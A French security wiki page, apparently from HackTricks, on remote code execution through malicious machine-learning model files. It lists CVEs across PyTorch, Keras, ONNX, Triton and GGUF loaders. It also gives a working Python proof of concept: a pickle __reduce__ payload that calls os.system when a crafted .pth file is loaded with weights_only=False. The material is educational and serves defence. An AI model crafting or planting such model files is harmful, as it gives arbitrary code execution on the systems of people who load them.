# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Chargement des modèles pour RCE

Les modèles d'apprentissage automatique sont généralement partagés dans différents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ces modèles peuvent être chargés sur les machines des développeurs ou dans des systèmes de production pour les utiliser. En général, les modèles ne devraient pas contenir de code malveillant, mais il existe des cas où le modèle peut être utilisé pour exécuter du code arbitraire sur le système en tant que fonctionnalité prévue ou en raison d'une vulnérabilité dans la bibliothèque de chargement du modèle.

Au moment de la rédaction, voici quelques exemples de ce type de vulnérabilités :

| **Framework / Outil**      | **Vulnérabilité (CVE si disponible)**                                                                                       | **Vecteur RCE**                                                                                                                        | **Références**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Désérialisation non sécurisée dans* `torch.load` **(CVE-2025-32434)**                                                      | Pickle malveillant dans le point de contrôle du modèle conduit à l'exécution de code (contournant la protection `weights_only`)         | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + téléchargement de modèle malveillant provoque l'exécution de code ; désérialisation RCE Java dans l'API de gestion              | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML non sécurisé) <br> **CVE-2024-3660** (Keras Lambda)                                               | Chargement de modèle à partir de YAML utilise `yaml.unsafe_load` (exécution de code) <br> Chargement de modèle avec une couche **Lambda** exécute du code Python arbitraire | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (analyse TFLite)                                                                                         | Modèle `.tflite` conçu déclenche un dépassement d'entier → corruption de la mémoire (RCE potentiel)                                     | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Chargement d'un modèle via `joblib.load` exécute pickle avec le payload `__reduce__` de l'attaquant                                    | |
| **NumPy** (Python)          | **CVE-2019-6446** (non sécurisé `np.load`) *contesté*                                                                        | `numpy.load` par défaut permettait des tableaux d'objets picklés – `.npy/.npz` malveillant déclenche l'exécution de code              | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversée de répertoire) <br> **CVE-2024-5187** (traversée tar)                                         | Le chemin des poids externes du modèle ONNX peut échapper au répertoire (lecture de fichiers arbitraires) <br> Modèle ONNX malveillant tar peut écraser des fichiers arbitraires (menant à RCE) | |
| ONNX Runtime (risque de conception) | *(Pas de CVE)* opérations personnalisées ONNX / flux de contrôle                                                        | Modèle avec opérateur personnalisé nécessite le chargement du code natif de l'attaquant ; des graphes de modèles complexes abusent de la logique pour exécuter des calculs non prévus | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversée de chemin)                                                                                     | Utiliser l'API de chargement de modèle avec `--model-control` activé permet la traversée de chemin relatif pour écrire des fichiers (par exemple, écraser `.bashrc` pour RCE) | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (multiples dépassements de tas)                                                                  | Fichier de modèle GGUF malformé provoque des dépassements de tampon dans le parseur, permettant l'exécution de code arbitraire sur le système victime | |
| **Keras (anciens formats)** | *(Pas de nouveau CVE)* Modèle Keras H5 hérité                                                                                 | Modèle HDF5 (`.h5`) malveillant avec code de couche Lambda s'exécute toujours au chargement (Keras safe_mode ne couvre pas l'ancien format – "attaque de rétrogradation") | |
| **Autres** (général)        | *Flaw de conception* – Sérialisation Pickle                                                                                  | De nombreux outils ML (par exemple, formats de modèle basés sur pickle, Python `pickle.load`) exécuteront du code arbitraire intégré dans les fichiers de modèle à moins d'être atténués | |

De plus, il existe des modèles basés sur pickle Python comme ceux utilisés par [PyTorch](https://github.com/pytorch/pytorch/security) qui peuvent être utilisés pour exécuter du code arbitraire sur le système s'ils ne sont pas chargés avec `weights_only=True`. Ainsi, tout modèle basé sur pickle pourrait être particulièrement susceptible à ce type d'attaques, même s'ils ne sont pas listés dans le tableau ci-dessus.

Exemple :

- Créer le modèle :
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Charger le modèle :
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
